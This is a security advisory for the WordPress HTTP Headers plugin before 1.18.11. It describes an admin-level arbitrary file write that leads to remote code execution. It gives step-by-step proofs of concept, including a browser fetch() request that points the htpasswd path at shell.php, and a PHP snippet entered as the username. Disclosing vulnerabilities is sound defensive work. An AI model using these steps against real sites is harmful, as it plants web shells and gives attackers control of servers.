## WordPress Plugin Vulnerabilities

# HTTP Headers < 1.18.11 - Admin+ Remote Code Execution

### Description

This plugin allows arbitrary data to be written to arbitrary files, leading to a Remote Code Execution vulnerability.

### Proof of Concept

--- <= 1.18.10 PoC ---
1. As an admin, visit http://vulnerable-site.tld/wp-admin/options-general.php?page=http-headers&tab=advanced, and paste the following in your browser's prompt:
await fetch("/wp-admin/options.php", {
"credentials": "include",
"headers": {
"Content-Type": "application/x-www-form-urlencoded",
},
"body": `option\_page=http-headers-mtd&action=update&\_wpnonce=${jQuery('#\_wpnonce').attr('value')}&\_wp\_http\_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dhttp-headers%26tab%3Dadvanced&hh\_htaccess\_path=%2Fvar%2Fwww%2Fhtml%2F.htaccess&hh\_user\_ini\_path=%2Fvar%2Fwww%2Fhtml%2F.user.ini&hh\_htpasswd\_path=%2Fvar%2Fwww%2Fhtml%2Fshell.php&hh\_htdigest\_path=%2Fvar%2Fwww%2Fhtml%2F.hh-htdigest&hh\_method=htaccess`,
"method": "POST",
"mode": "cors"
});
2. Navigate to http://vulnerable-site.tld/wp-admin/options-general.php?page=http-headers&header=www-authenticate
3. Ensure WWW-Authenticate is enabled, and fill the form with Username "<?php echo "RCE" ?>" and Password as any value.
4. Navigate to Settings > HTTP Headers > Advanced settings and set the "Location of .hh-htpasswd" field to its previous value (this is only required on Apache-based servers in order to reset a rule in the .htaccess file).
5. Go to /shell.php and see the RCE text.
--- Pre-1.18.8 PoC ---
1. As an admin user within WP Admin, navigate to Settings > HTTP Headers > Advanced settings.
2. Change the "Location of .hh-htpasswd" field: update the file name to "shell.php" (e.g. /var/www/html/shell.php)
3. Navigate to Settings > HTTP Headers > Authentication. Click "Edit" to the right of "WWW-Authenticate".
4. Ensure WWW-Authenticate is enabled, and fill the form with Username "<?php echo "RCE" ?>" and Password as any value.
5. Navigate to Settings > HTTP Headers > Advanced settings and set the "Location of .hh-htpasswd" field to its previous value (this is only required on Apache-based servers in order to reset a rule in the .htaccess file).
6. Go to /shell.php and see the RCE text.
